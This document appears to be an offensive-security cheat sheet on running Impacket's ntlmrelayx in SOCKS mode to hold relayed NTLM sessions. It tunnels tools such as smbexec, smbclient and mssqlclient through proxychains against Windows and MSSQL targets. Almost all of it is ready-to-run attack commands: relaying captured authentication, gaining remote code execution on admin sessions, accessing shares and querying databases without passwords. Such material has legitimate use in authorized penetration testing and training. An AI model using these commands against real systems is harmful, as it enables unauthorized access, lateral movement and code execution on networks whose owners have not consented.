# 12.09 ntlmrelayx SOCKS Mode

> Keep relayed sessions alive as a SOCKS4 proxy on `127.0.0.1:1080` and run any Impacket tool through `proxychains`.

## Overview

SOCKS mode keeps relayed sessions alive as a SOCKS4 proxy on 127.0.0.1:1080. Use proxychains to tunnel any Impacket tool through held sessions. Check AdminStatus TRUE with the interactive socks command to know which sessions allow code execution vs. share access only.

## Steps

- Run ntlmrelayx with -socks; it starts a SOCKS proxy on port 1080
- Ensure /etc/proxychains4.conf has: socks4 127.0.0.1 1080
- In ntlmrelayx prompt run: socks (lists all active sessions with AdminStatus)
- Use proxychains4 -q smbexec.py with -no-pass for admin sessions
- Use proxychains4 -q smbclient.py with -no-pass for non-admin share access
- Use proxychains -q mssqlclient.py with -windows-auth -no-pass for MSSQL sessions
- Keep ntlmrelayx running or SOCKS sessions close

## Commands

### SOCKS SMB relay

```bash
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks
```

### proxychains config

```text
socks4  127.0.0.1 1080
```

### smbexec via SOCKS (admin)

```bash
proxychains4 -q smbexec.py <DOMAIN>/[email protected] -no-pass
```

### smbclient via SOCKS (non-admin)

```bash
proxychains4 -q smbclient.py <DOMAIN>/[email protected] -no-pass
```

### mssqlclient via SOCKS

```bash
proxychains -q mssqlclient.py <DOMAIN>/[email protected] -windows-auth -no-pass
```

### MSSQL SOCKS relay

```bash
sudo ntlmrelayx.py -t mssql://172.16.117.60 -smb2support -socks
```

### MSSQL direct query

```bash
sudo ntlmrelayx.py -t mssql://<DOMAIN>\\[email protected] -smb2support -q "SELECT name FROM sys.databases;"
```
